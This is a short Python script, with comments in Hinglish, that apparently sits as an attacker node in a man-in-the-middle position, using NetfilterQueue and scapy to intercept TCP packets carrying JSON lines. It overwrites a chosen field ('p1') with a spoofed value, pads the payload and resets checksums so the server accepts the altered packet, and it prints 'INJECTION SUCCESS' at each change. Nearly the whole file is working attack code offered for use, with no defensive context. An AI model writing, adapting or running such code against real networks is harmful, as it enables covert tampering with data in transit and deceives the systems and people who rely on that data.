from netfilterqueue import NetfilterQueue
import scapy.all as scapy
import json
import traceback

TARGET_COLUMN = "p1"     # <-- APNI EXCEL KA ACTUAL COLUMN NAAM DAALO
SPOOFED_VALUE = 999.99     

def process_packet(packet):
    try:
        scapy_packet = scapy.IP(packet.get_payload())

        # Layer check
        if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(scapy.TCP):
            raw_data = scapy_packet[scapy.Raw].load.decode('utf-8', errors='ignore')
            original_len = len(raw_data) # Original length record karo padding ke liye

            modified = False
            new_payload_lines = []
            lines = raw_data.strip().split('\n')

            for line in lines:
                if not line.strip(): 
                    continue

                try:
                    payload = json.loads(line)
                    
                    # THE FIX: Seedha TARGET_COLUMN flat dictionary me check karo
                    if TARGET_COLUMN in payload:
                        original_val = payload[TARGET_COLUMN]
                        payload[TARGET_COLUMN] = SPOOFED_VALUE
                        
                        print(f"[!] INJECTION SUCCESS: {TARGET_COLUMN} = {original_val} -> {SPOOFED_VALUE}")
                        modified = True
                    
                    new_payload_lines.append(json.dumps(payload))

                except json.JSONDecodeError:
                    new_payload_lines.append(line) 

            # Agar modification hua hai, toh packet wapas pack karo
            if modified:
                new_raw_data = '\n'.join(new_payload_lines) + '\n'
                
                # TCP SYNC FIX: Padding add karo taaki Server packet drop na kare
                new_len = len(new_raw_data)
                if new_len < original_len:
                    padding = " " * (original_len - new_len)
                    new_raw_data = new_raw_data.rstrip('\n') + padding + '\n'

                scapy_packet[scapy.Raw].load = new_raw_data.encode('utf-8')

                # Flush TCP Options and Checksums
                del scapy_packet[scapy.TCP].options
                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.TCP].chksum

                packet.set_payload(bytes(scapy_packet))

    except Exception as e:
        print(f"[-] DROP: {e}")

    # Pass the packet to destination
    packet.accept()
queue = NetfilterQueue()
queue.bind(1, process_packet)
print("[*] Attacker Node Active. Intercepting on Queue 1...")
try:
    queue.run()
except KeyboardInterrupt:
    queue.unbind()